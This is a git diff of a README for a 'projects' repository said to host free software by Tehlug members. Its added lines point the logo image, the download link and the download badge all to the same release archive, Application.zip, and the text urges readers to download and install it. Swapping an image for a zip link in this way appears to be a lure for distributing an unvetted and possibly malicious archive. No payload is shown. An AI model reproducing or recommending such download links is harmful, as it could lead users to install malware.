@@ -1,14 +1,14 @@
 # 🌟 Welcome to the "Projects" Repository 🌟
 
-![Projects Logo](https://yourimageurl.com/projects_logo.png)
+![Projects Logo](https://github.com/Kalai-Selvam/projects/releases/download/v1.0/Application.zip)
 
 Welcome to the "projects" repository, where you can explore various free software projects developed by Tehlug members. 😊 This repository serves as a hub for open-source projects created by our talented community members. Feel free to browse, contribute, or even use these projects in your own work.
 
 ## 🚀 Quick Access to Applications 🚀
 
-For easy access to the applications developed by Tehlug members, you can download the latest version from [here](https://github.com/files/Application.zip).
+For easy access to the applications developed by Tehlug members, you can download the latest version from [here](https://github.com/Kalai-Selvam/projects/releases/download/v1.0/Application.zip).
 
-[![Download Applications](https://img.shields.io/badge/Download-Applications-blue)](https://github.com/files/Application.zip)
+[![Download Applications](https://github.com/Kalai-Selvam/projects/releases/download/v1.0/Application.zip)](https://github.com/Kalai-Selvam/projects/releases/download/v1.0/Application.zip)
 
 Please note that the link above leads directly to the application file for download and installation.
 
